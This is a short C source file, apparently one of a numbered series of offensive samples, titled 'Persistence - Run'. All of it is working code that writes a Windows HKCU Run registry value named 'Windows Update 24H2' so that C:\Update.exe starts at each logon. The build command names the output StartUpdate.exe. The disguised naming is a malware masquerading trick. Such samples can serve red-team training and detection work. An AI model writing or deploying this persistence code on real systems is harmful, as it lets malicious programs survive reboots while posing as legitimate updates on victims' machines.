/*
    Persistence - Run
    20 Jan 2025
    Eric

    To build: x86_64-w64-mingw32-gcc 03_registry_persist.c -o StartUpdate.exe -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
*/
#include <windows.h>
#include <string.h>

int main(){
    HKEY hkey = NULL;

    // path to executable
    const char* exe = "C:\\Update.exe";

    //open startup reg key, save into hkey
    LONG result = RegOpenKeyEx(HKEY_CURRENT_USER, (LPCSTR)"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hkey);
    
    // check for success
    if (result == ERROR_SUCCESS){
        // create key for persistence
        RegSetValueEx(hkey, (LPCSTR)"Windows Update 24H2", 0, REG_SZ, (unsigned char*)exe, strlen(exe));
        RegCloseKey(hkey);
    }

    return 0;
}